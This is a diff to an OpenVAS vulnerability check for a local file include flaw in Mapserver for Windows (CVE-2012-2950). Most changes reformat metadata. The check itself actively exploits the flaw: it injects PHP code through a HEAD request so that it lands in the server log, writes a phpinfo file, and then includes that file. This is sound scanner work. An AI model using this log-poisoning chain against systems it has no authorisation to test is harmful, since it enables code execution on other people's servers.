@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_mapserver4win_53737.nasl 5714 2017-03-24 10:52:48Z cfi $
+# $Id: gb_mapserver4win_53737.nasl 10323 2018-06-26 07:32:48Z cfischer $
 #
 # Mapserver for Windows Local File Include Vulnerability
 #
@@ -25,50 +25,51 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "Mapserver for Windows (MS4W) is prone to an local file include vulnerability
-because it fails to sufficiently sanitize user supplied input.
-
-An attacker can exploit this vulnerability to view files and execute
-arbitrary local PHP scripts with the privileges of the affected
-application.
-
-Mapserver for Windows versions 2.0 through 3.0.4 are vulnerable.";
-
-tag_solution = "Updates are available. Please contact the vendor for more information.";
-
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.103602");
- script_bugtraq_id(53737);
- script_cve_id("CVE-2012-2950");
- script_tag(name:"cvss_base", value:"9.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
- script_version ("$Revision: 5714 $");
- script_name("Mapserver for Windows Local File Include Vulnerability");
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53737");
- script_xref(name : "URL" , value : "http://maptools.org/ms4w/index.phtml?page=home.html");
- script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522908");
+  script_oid("1.3.6.1.4.1.25623.1.0.103602");
+  script_bugtraq_id(53737);
+  script_cve_id("CVE-2012-2950");
+  script_tag(name:"last_modification", value:"$Date: 2018-06-26 09:32:48 +0200 (Tue, 26 Jun 2018) $");
+  script_tag(name:"creation_date", value:"2012-11-02 10:11:35 +0100 (Fri, 02 Nov 2012)");
+  script_tag(name:"cvss_base", value:"9.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
+  script_version("$Revision: 10323 $");
+  script_name("Mapserver for Windows Local File Include Vulnerability");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
+  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("Host/runs_windows");
+  script_exclude_keys("Settings/disable_cgi_scanning");
 
- script_tag(name:"last_modification", value:"$Date: 2017-03-24 11:52:48 +0100 (Fri, 24 Mar 2017) $");
- script_tag(name:"creation_date", value:"2012-11-02 10:11:35 +0100 (Fri, 02 Nov 2012)");
- script_category(ACT_ATTACK);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("Host/runs_windows");
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "solution" , value : tag_solution);
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53737");
+  script_xref(name:"URL", value:"http://maptools.org/ms4w/index.phtml?page=home.html");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522908");
+
+  script_tag(name:"summary", value:"Mapserver for Windows(MS4W)is prone to an local file include vulnerability
+  because it fails to sufficiently sanitize user supplied input.");
+
+  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to view files and execute
+  arbitrary local PHP scripts with the privileges of the affected application.");
+
+  script_tag(name:"affected", value:"Mapserver for Windows versions 2.0 through 3.0.4 are vulnerable.");
+
+  script_tag(name:"solution", value:"Updates are available. Please contact the vendor for more information.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"VendorFix");
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
-   
+
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
+host = http_host_name( port:port );
 
 foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
 
@@ -92,23 +93,18 @@ foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
         if(!isnull(pa[1])) {
           path = pa[1];
           break;
-        }  
-      }  
-    }  
+        }
+      }
+    }
 
     if(!path || strlen(path) < 1)exit(0);
 
     file = 'openvas_' + rand() + '.php';
     php = "<?php file_put_contents('../htdocs/" + file +"', '<?php phpinfo();?>'); ?>";
 
-    req = string("HEAD ", php,dir,"/ HTTP/1.1\r\n",
-                 "Host: ", get_host_name(),"\r\n\r\n");
-
-    soc = open_sock_tcp(port);
-    if(!soc)exit(0);
-
-    send(socket:soc, data:req);
-    close(soc);
+    req = string("HEAD ", php, dir, "/ HTTP/1.1\r\n",
+                 "Host: ", host,"\r\n\r\n");
+    http_send_recv(port:port, data:req);
 
     path -= 'htdocs';
     path = str_replace(string:path, find:'/', replace:'\\');
@@ -123,11 +119,11 @@ foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
     buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
     if("<title>phpinfo()" >< buf) {
+      report = report_vuln_url(port:port, url:url);
       security_message(port:port);
       exit(0);
-    }  
+    }
   }
 }
 
-exit(0);
-
+exit(99);
